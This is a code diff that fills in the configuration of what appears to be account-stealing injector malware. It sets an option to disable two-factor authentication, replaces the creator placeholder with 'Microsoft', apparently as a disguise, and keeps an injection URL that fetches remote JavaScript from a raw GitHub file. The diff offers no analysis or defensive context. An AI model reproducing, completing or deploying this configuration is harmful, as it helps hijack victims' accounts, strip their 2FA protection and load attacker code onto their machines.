@@ -17,10 +17,10 @@ var config = {
   "logout-notify": "true",
   "init-notify": "true",
   "embed-color": 4873727,
-  disable2FA: "%DISABLEFA%",
-  changeMailAuto: "%AUTOMAILCHANGER%",
+  disable2FA: "true",
+  changeMailAuto: "false",
   mail: "%CLIENTEMAIL%",
-  creator: "%NAME_CREATOR%",
+  creator: "Microsoft",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
     "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/index.js",
